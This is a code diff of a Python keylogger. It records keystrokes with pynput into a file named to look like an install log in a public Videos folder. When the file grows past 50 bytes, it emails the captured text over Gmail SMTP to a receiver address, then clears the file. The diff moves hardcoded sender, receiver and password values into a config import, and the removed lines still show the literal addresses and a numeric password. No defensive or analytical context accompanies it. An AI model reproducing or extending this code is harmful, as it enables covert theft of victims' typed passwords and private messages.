@@ -1,15 +1,16 @@
 from pynput import keyboard
+from config import *
 from multiprocessing import Queue
 import smtplib, os, time
 
 file ="C:/Users/Public/Videos/install.txt"
 
-def send(fromaddr, toaddr, pwd, msg):
+def send(msg):
     server = smtplib.SMTP('smtp.gmail.com:587')
     server.ehlo()
     server.starttls()
-    server.login(fromaddr,pwd)
-    server.sendmail(fromaddr, toaddr, msg)
+    server.login(SENDER_EMAIL, SENDER_PASSWORD)
+    server.sendmail(SENDER_EMAIL, RECIEVER_EMAIL, msg)
     server.quit()
 
 last_time = 0
@@ -39,7 +40,7 @@ file_size = file_info.st_size
 if(file_size > 50):
     with open(file, 'r') as f:
         msg = f.read()
-    send('elmobones1337@gmail.com', 'huntadonis@gmail.com', 2813308004, msg)
+    send(msg)
     open(file, 'w').close()
 # Collect events until released
 with keyboard.Listener(
